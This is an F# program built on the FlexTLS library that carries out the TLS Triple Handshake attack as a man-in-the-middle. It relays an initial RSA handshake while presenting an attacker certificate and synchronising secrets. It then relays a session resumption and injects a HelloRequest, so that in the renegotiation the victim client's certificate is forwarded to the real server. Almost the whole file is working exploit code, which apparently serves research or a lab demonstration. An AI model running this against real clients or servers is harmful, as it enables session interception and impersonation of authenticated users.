#light "off"

module Program

open Bytes
open Error
open TLSInfo
open TLSConstants
open Cert
open RSA

open FlexTLS
open FlexTypes
open FlexConstants  
open FlexHandshake 
open FlexConnection 
open FlexClientHello 
open FlexServerHello 
open FlexCertificate 
open FlexServerHelloDone 
open FlexClientKeyExchange 
open FlexServerKeyShare
open FlexCCS 
open FlexFinished 
open FlexState
open FlexSecrets
open HandshakeMessages
open FlexAlert



let private getEnvOrDefault (name:string) (defaultValue:string) : string =
    let value = System.Environment.GetEnvironmentVariable name in
    if System.String.IsNullOrWhiteSpace value then defaultValue else value

let listenHost = getEnvOrDefault "LISTEN_HOST" "0.0.0.0"
let listenPort = int (getEnvOrDefault "LISTEN_PORT" "8443")
let serverHost = getEnvOrDefault "SERVER_HOST" "server"
let serverPort = int (getEnvOrDefault "SERVER_PORT" "4433")

// First handshake: attacker as server (toward real client) and as client (toward real server).
let performInitialHandshake (mitmAsServerState: state, mitmAsServerConfig: config, attackerCertChain: Cert.chain, attackerPrivKey: RSAKey.sk)
                            (mitmAsClientState: state, mitmAsClientConfig: config) : state * state * Cert.chain =   

    let mitmAsServerState, clientNextCtx, clientHello = FlexClientHello.receive(mitmAsServerState) in
    match FlexServerHello.negotiate (FlexClientHello.getCiphersuites clientHello) FlexConstants.defaultRSACiphersuites with
        | None -> failwith "Triple Handshake demo only implemented for RSA key exchange"
        | Some(rsa_kex_cs) ->
    
    let clientHelloCipherSuites = { clientHello with ciphersuites = Some([rsa_kex_cs]) } in
    let mitmAsClientState, serverNextCtx, clientHelloCipherSuites = FlexClientHello.send(mitmAsClientState, clientHelloCipherSuites) in
    
    let mitmAsClientState, serverNextCtx, serverHello = FlexServerHello.receive(mitmAsClientState, clientHelloCipherSuites, serverNextCtx) in
    let mitmAsServerState, clientNextCtx, serverHelloRecord = FlexServerHello.send(mitmAsServerState, clientHello, clientNextCtx, serverHello) in

    let mitmAsClientState, serverNextCtx, _ = FlexCertificate.receive(mitmAsClientState, Client, serverNextCtx) in
    let mitmAsServerState, clientNextCtx, _ = FlexCertificate.send(mitmAsServerState, Server, attackerCertChain, clientNextCtx) in 

    let mitmAsClientState, mitmAsServerState, _ = FlexHandshake.forward(mitmAsClientState, mitmAsServerState) in 

    let mitmAsServerState, clientNextCtx, clientKeyExchange = FlexClientKeyExchange.receiveRSA(mitmAsServerState, clientNextCtx, clientHello) in 

    let updatedSecrets = { serverNextCtx.secrets with kex = clientNextCtx.secrets.kex } in 
    let serverNextCtx = { serverNextCtx with secrets = updatedSecrets } in
    
    let mitmAsClientState, serverNextCtx, _ = FlexClientKeyExchange.sendRSA(mitmAsClientState, serverNextCtx, clientHelloCipherSuites) in

    let mitmAsServerState, mitmAsClientState, _ = FlexCCS.forward(mitmAsServerState, mitmAsClientState) in 

    let mitmAsServerState = FlexState.installReadKeys mitmAsServerState clientNextCtx in 
    let mitmAsClientState = FlexState.installWriteKeys mitmAsClientState serverNextCtx in

    let mitmAsServerState, _ = FlexFinished.receive(mitmAsServerState, clientNextCtx, Client) in
    let mitmAsClientState, _ = FlexFinished.send(mitmAsClientState, serverNextCtx, Client) in

    let mitmAsClientState, mitmAsServerState, _ = FlexCCS.forward(mitmAsClientState, mitmAsServerState) in

    let mitmAsClientState = FlexState.installReadKeys mitmAsClientState serverNextCtx in 
    let mitmAsServerState = FlexState.installWriteKeys mitmAsServerState clientNextCtx in

    let mitmAsClientState, _ = FlexFinished.receive(mitmAsClientState, serverNextCtx, Server) in
    let mitmAsServerState, _ = FlexFinished.send(mitmAsServerState, clientNextCtx, Server) in

    (mitmAsServerState, mitmAsClientState, attackerCertChain)

// Second handshake: attacker relays between client and server.
let performResumptionHandshake (mitmAsServerState: state, mitmAsServerConfig: config) (mitmAsClientState: state, mitmAsClientConfig: config) : state * state =

    let mitmAsServerState, clientNextCtx, resumedClientHello = FlexClientHello.receive(mitmAsServerState) in
    let mitmAsClientState, serverNextCtx, _ = FlexClientHello.send(mitmAsClientState, resumedClientHello) in 

    let mitmAsClientState, serverNextCtx, serverHello =  FlexServerHello.receive(mitmAsClientState, resumedClientHello, serverNextCtx) in 
    let mitmAsServerState, clientNextCtx, _ = FlexServerHello.send(mitmAsServerState, resumedClientHello, clientNextCtx, serverHello) in 

    let mitmAsServerState, mitmAsClientState, _ = FlexCCS.forward(mitmAsServerState, mitmAsClientState) in

    let mitmAsServerState = FlexState.installReadKeys mitmAsServerState clientNextCtx in
    let mitmAsClientState = FlexState.installWriteKeys mitmAsClientState serverNextCtx in

    let mitmAsServerState, _ = FlexFinished.receive(mitmAsServerState, clientNextCtx, Client) in
    let mitmAsClientState, _ = FlexFinished.send(mitmAsClientState, serverNextCtx, Client) in

    let mitmAsClientState, mitmAsServerState, _ = FlexCCS.forward(mitmAsClientState, mitmAsServerState) in 

    let mitmAsClientState = FlexState.installReadKeys mitmAsClientState serverNextCtx in
    let mitmAsServerState = FlexState.installWriteKeys mitmAsServerState clientNextCtx in 

    let mitmAsClientState, _ = FlexFinished.receive(mitmAsClientState, serverNextCtx, Server) in
    let mitmAsServerState, _ = FlexFinished.send(mitmAsServerState, clientNextCtx, Server) in 

    (mitmAsServerState, mitmAsClientState)

// Renegotiation handshake: attacker injects HelloRequest and checks victim client reuses its original cert.
let performRenegotiation (mitmAsServerState: state, mitmAsServerConfig: config, originalChain: Cert.chain) (mitmAsClientState: state, mitmAsClientConfig: config) : state * state * Cert.chain =
    
    let mitmAsServerState = FlexHandshake.send(mitmAsServerState, HandshakeMessages.helloRequestBytes) in
    let mitmAsClientState = FlexHandshake.send(mitmAsClientState, HandshakeMessages.helloRequestBytes) in

    let mitmAsServerState, clientNextCtx, renegClientHello = FlexClientHello.receive(mitmAsServerState) in

    let mitmAsClientState, serverNextCtx, renegClientHelloSent = FlexClientHello.send(mitmAsClientState, renegClientHello) in
    let mitmAsClientState, serverNextCtx, serverHello = FlexServerHello.receive(mitmAsClientState, renegClientHelloSent, serverNextCtx) in
    let mitmAsServerState, clientNextCtx, _ = FlexServerHello.send(mitmAsServerState, renegClientHello, clientNextCtx, serverHello) in

    let mitmAsServerState, clientNextCtx, clientCertificateMsg = FlexCertificate.receive(mitmAsServerState, Client, clientNextCtx) in
    let victimClientChain = clientCertificateMsg.chain in

    let mitmAsClientState, mitmAsServerState, _ = FlexHandshake.forward(mitmAsClientState, mitmAsServerState) in

    let mitmAsClientState, serverNextCtx, _ = FlexCertificate.send(mitmAsClientState, Client, victimClientChain, serverNextCtx) in

    let mitmAsServerState, mitmAsClientState, _ = FlexHandshake.forward(mitmAsServerState, mitmAsClientState) in 

    let mitmAsClientState, mitmAsServerState, _ = FlexHandshake.forward(mitmAsClientState, mitmAsServerState) in 

    (mitmAsServerState, mitmAsClientState, victimClientChain)

[<EntryPoint>]
let main _ =

    let mitmAsServerState, mitmAsServerConfig, mitmAsClientState, mitmAsClientConfig =
        FlexConnection.MitmOpenTcpConnections(
            listen_address = listenHost,
            listen_port    = listenPort,
            server_address = serverHost,
            server_port    = serverPort)
    in
    
    let certDir = "/certs" in
    let attackerCertChain = Cert.chainFromFile (certDir + "/server.crt") in
    let attackerPrivKey   = RSA.load (certDir + "/server.key") in
    let caRootChain       = Cert.chainFromFile (certDir + "/ca.crt") in
    
    let serverConfigNoAuth = { mitmAsServerConfig with request_client_certificate = false } in
    
    let clientConfigTrustOnly = mitmAsClientConfig in
   
    let state1_server, state1_client, attackerCertChain = 
    performInitialHandshake (mitmAsServerState, serverConfigNoAuth, attackerCertChain, attackerPrivKey)
                            (mitmAsClientState, clientConfigTrustOnly) in

    let state2_server, state2_client = performResumptionHandshake (state1_server, serverConfigNoAuth)
                               (state1_client, clientConfigTrustOnly) in

    let serverConfigWithAuth = { serverConfigNoAuth with request_client_certificate = true } in

    let state3_server, state3_client, victimClientChain = 
    performRenegotiation (state2_server, serverConfigWithAuth, attackerCertChain)
                         (state2_client, clientConfigTrustOnly) in
    
    0
    